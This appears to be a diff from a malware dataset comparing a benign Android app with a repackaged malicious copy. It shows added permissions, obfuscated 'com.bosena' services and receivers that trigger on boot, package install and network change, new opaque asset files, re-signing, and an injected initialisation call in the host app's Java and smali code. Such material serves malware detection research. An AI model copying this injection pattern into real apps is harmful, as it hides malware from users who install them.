@@ -1,0 +1,280 @@
+diff -r result/APP_24/App_B_24/AndroidManifest.xml result/APP_24/App_M_24/AndroidManifest.xml
+4a5,13
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+13a23,92
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.bosena.zumall.CitySeltyActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.bosena.zumall.UlletMsaeri"/>
+>         <receiver android:name="com.bosena.zumall.WosdRzsen">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.bosena.zumall.onerv.TsoydenVerco"/>
+>         <service android:name="com.bosena.zumall.onerv.NativeBally"/>
+>         <receiver android:name="com.bosena.zumall.onerv.BxlryActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.bosena.tcosew.UsenAco" android:screenOrientation="portrait"/>
+>         <receiver android:name="com.bosena.tcosew.CusleyActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="com.bosena.zumall.tosne.MsekieTsleu"/>
+>         <receiver android:name="com.bosena.zumall.tosne.CoseSooxty">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.bosena.zumall.tosne.VsleScien"/>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.bosena.birena.NaceAsenren"/>
+>         <service android:name="com.bosena.birena.LooadRsenier"/>
+>         <receiver android:name="com.bosena.birena.TsinVsen">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+diff -r result/APP_24/App_B_24/apktool.yml result/APP_24/App_M_24/apktool.yml
+2c2
+< apkFileName: Bapp24-30D7F8D4F1F63E5F33EBBEDC0A3E68CCAC221D19466F4ACB5BBF5701806AAAFF.apk
+---
+> apkFileName: Mapp24-01C1011ACDAC7A9CF40231626B5C4F556FC8EC92A173F3B87897CEBE70BEB883.apk
+8d7
+< - mp3
+9a9
+> - mp3
+19,21c19
+< unknownFiles:
+<   jsr305_annotations/Jsr305_annotations.gwt.xml: '8'
+<   jsr305_annotations/v0_r47/V0_r47.gwt.xml: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_24/App_M_24/: assets
+Somente em result/APP_24/App_M_24/com: bosena
+diff -r result/APP_24/App_B_24/com/computertimeco/android/saint_ad/Saint.java result/APP_24/App_M_24/com/computertimeco/android/saint_ad/Saint.java
+13a14
+> import com.bosena.tcosew.CocoliyActivity;
+41a43
+>     CocoliyActivity.init(this);
+Os arquivos binários result/APP_24/App_B_24/original/AndroidManifest.xml e result/APP_24/App_M_24/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_24/App_B_24/original/META-INF/CERT.RSA e result/APP_24/App_M_24/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_24/App_B_24/original/META-INF/CERT.SF result/APP_24/App_M_24/original/META-INF/CERT.SF
+2,3c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: vGPLfYMfmNF8z86+SydlwfmnA0E=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: wZgwWtFFjsbWuTYZ0ea1G/HPQsY=
+35,36c35,36
+< Name: jsr305_annotations/v0_r47/V0_r47.gwt.xml
+< SHA1-Digest: E9F85/qDCNqclUF1swwnG6QZXwg=
+---
+> Name: assets/jas/cors.dat
+> SHA1-Digest: kXpuR5uk/nTbZtZN6vOOHUkVs1o=
+84c84
+< SHA1-Digest: sx2YVVAGQKqIyPoxPjjkQ7+8O+I=
+---
+> SHA1-Digest: G7+iqWD5XCB3c7vjwoZmFlRvQus=
+90c90
+< SHA1-Digest: lg5ltErq7zuj/aWhHLhwV7YZ8v8=
+---
+> SHA1-Digest: Aq61CotoD5ziyvojFYMjI+soRHA=
+106a107,109
+> Name: assets/9.dat
+> SHA1-Digest: jNZ757NKPkYYqIpK8035xX+Xon0=
+> 
+141c144
+< SHA1-Digest: 3v1Z8kqubUljD+dNlA5Aw+dcz/w=
+---
+> SHA1-Digest: ERB9MSdOeTAwkzZOxp2T4Wy0Cwg=
+153c156
+< SHA1-Digest: eDrsK7HsV2y9/5PKScSjBhrSQ7I=
+---
+> SHA1-Digest: OZdWkNKUTFB1q5Bdz5zzD3dKRrE=
+207c210
+< SHA1-Digest: TFKeJ/GMxsIUc+yAC7uGyRKxo6g=
+---
+> SHA1-Digest: GzfEIvBAGNDvJYcP83iASz9BQx4=
+261c264
+< SHA1-Digest: M6RSuT5DcoPQoVUtBOnbfuKZqYs=
+---
+> SHA1-Digest: vZrFB8Pq1va93YW5UUyN7GtHCz0=
+291c294
+< SHA1-Digest: 8MePwOT1JckR57Usira60bIHpRc=
+---
+> SHA1-Digest: ovie5HbkNzq8lCmRHJnX5sJBzTE=
+333c336
+< SHA1-Digest: CTmE7AWBXfBUtNN6Q8sxC8+d5Vc=
+---
+> SHA1-Digest: EdmPSg+WcvKDfG69GS5gLo6KmaI=
+435c438
+< SHA1-Digest: fmuQOHo86+acPGtxcHNo5KGunII=
+---
+> SHA1-Digest: ldnfhx0AappJnOrkbMMWg3WZpDA=
+444c447
+< SHA1-Digest: int8o+0BO/P5E2Yb4DINP1TBG/Q=
+---
+> SHA1-Digest: 5S2QFG8Gwy3T7Yj62VJ3npdGIJs=
+454a458,460
+> Name: assets/bin/v.dat
+> SHA1-Digest: /7kwUUWRKS1QSt0Gh2O86XyRGOY=
+> 
+471c477
+< SHA1-Digest: b4amopMGk+Yjpph8prBm80FLKIU=
+---
+> SHA1-Digest: G7c9VLoBHz8w5TtM4bipAGcajB0=
+534c540
+< SHA1-Digest: rA4CHZ8VKu01oD9bTzRI2uYdst8=
+---
+> SHA1-Digest: cHRpjx+8KcXev+WFTXvIOJJJiL8=
+543c549
+< SHA1-Digest: CFkPSq2+WoPjvcWK0NifHDon0tc=
+---
+> SHA1-Digest: rzSnI2jijJbENoXAqxPCZPYw0JE=
+563,565d568
+< Name: jsr305_annotations/Jsr305_annotations.gwt.xml
+< SHA1-Digest: nsoCwYQvSoEvPZnRmRn0UzEPvoo=
+< 
+576c579
+< SHA1-Digest: gOeKvuvk6hfXKFf0IvpgLUT1clc=
+---
+> SHA1-Digest: JVJXtfiZh1m16FgcmaQmy9cJaeM=
+681c684
+< SHA1-Digest: /gL7Dqm/XmfgpDD50y6j74Pw/ss=
+---
+> SHA1-Digest: jnjRvED7l7xq/DyptFHmAbs4ork=
+diff -r result/APP_24/App_B_24/original/META-INF/MANIFEST.MF result/APP_24/App_M_24/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.0 (Android SignApk)
+34,35c34,35
+< Name: jsr305_annotations/v0_r47/V0_r47.gwt.xml
+< SHA1-Digest: /f34xYwskAvrKqRB+jFPzJ8rPJg=
+---
+> Name: assets/jas/cors.dat
+> SHA1-Digest: hZm7d/Jx5BPdDqPbDwtXCSeWJL4=
+83c83
+< SHA1-Digest: wSjwEVceZzClCK1Whfm82ACBCxE=
+---
+> SHA1-Digest: YjZ1leVsAfY6IKazMeJB8WjJwTQ=
+89c89
+< SHA1-Digest: 2pQ4xoCZmbmN5QtJKJMUqgciDjc=
+---
+> SHA1-Digest: 68BNeCuB1sQlOxJ4d7e8FggzZF4=
+105a106,108
+> Name: assets/9.dat
+> SHA1-Digest: zBoPjoLLdPOE2px5zmEHPyurils=
+> 
+140c143
+< SHA1-Digest: myvqAZW8K4CtodtToKiTXEzT+0k=
+---
+> SHA1-Digest: jkkofQh2WqWeRaJnqJ2QpNFq2dI=
+149c152
+< SHA1-Digest: Er8q7HHPP0+G+W017m2b1TNkyrc=
+---
+> SHA1-Digest: vGez6XNvoEY4B/4I0QgOcptpHaM=
+206c209
+< SHA1-Digest: lbYjOEeDNz8d2cikPitork0uAi4=
+---
+> SHA1-Digest: +JKnUfy2IS80uTRRv7JoelT9qf4=
+260c263
+< SHA1-Digest: T8jxvGT61AxF/bTT/pVPDtj8RNU=
+---
+> SHA1-Digest: 1Oaf9tb7LphrdwtRGSVqw3KdVGA=
+290c293
+< SHA1-Digest: 0D7OYwEaIfkCxD5eM0Dc2dtv1Tc=
+---
+> SHA1-Digest: 5tw/Nkc2IXupDiR90q0aeEWR6uM=
+332c335
+< SHA1-Digest: 1ahouCUE6/CjUm8lNpKHyUjAGfM=
+---
+> SHA1-Digest: 79zup9vA5OUTBEWnAFcHhZqFzRk=
+434c437
+< SHA1-Digest: 3sDItn6PpUy0E01mJ3s8FkY6js8=
+---
+> SHA1-Digest: rHCPEUWCfHX8F6jLgb97zREtUXE=
+443c446
+< SHA1-Digest: r0rFB5Z/duhCHoHcogwrHhxMcnU=
+---
+> SHA1-Digest: A5CW6BDhUAunNe+OEwPUMiVVT0M=
+453a457,459
+> Name: assets/bin/v.dat
+> SHA1-Digest: CgXM+6qGfPO7eve8pTbsbfp75/I=
+> 
+470c476
+< SHA1-Digest: R42IGSyeF/dgjkTkh3AI2eMH4CM=
+---
+> SHA1-Digest: QNwJ/jlOmBYqx9ay5+4kJWAiBaA=
+533c539
+< SHA1-Digest: 0R6OeJbWhvlCN6vLSfTED7Olmn4=
+---
+> SHA1-Digest: ogTAgjSHjCAGiPtd4gbYAli0Fzs=
+542c548
+< SHA1-Digest: SivcMdU/qQY5ArzQ5vlN7kzr9RA=
+---
+> SHA1-Digest: JbUMgGiN9XSdvnBXvGyO750NzN4=
+562,564d567
+< Name: jsr305_annotations/Jsr305_annotations.gwt.xml
+< SHA1-Digest: UBXHoAGmseBGDwjR6/MFHfcIK7g=
+< 
+575c578
+< SHA1-Digest: uQ2ab7Z9T2R3bVhnE1yB32HamMM=
+---
+> SHA1-Digest: Skn91i4yQTarDiEwKDBddgpD32I=
+680c683
+< SHA1-Digest: qdW773WrB5e/4DP038gn7Mn9hCA=
+---
+> SHA1-Digest: l08ZNlyVyNXRGfl/PsqBPP1uC4o=
+Somente em result/APP_24/App_M_24/smali/com: bosena
+diff -r result/APP_24/App_B_24/smali/com/computertimeco/android/saint_ad/Saint.smali result/APP_24/App_M_24/smali/com/computertimeco/android/saint_ad/Saint.smali
+73a74,75
+>     invoke-static {p0}, Lcom/bosena/tcosew/CocoliyActivity;->init(Landroid/content/Context;)V
+> 
+Somente em result/APP_24/App_B_24/: unknown
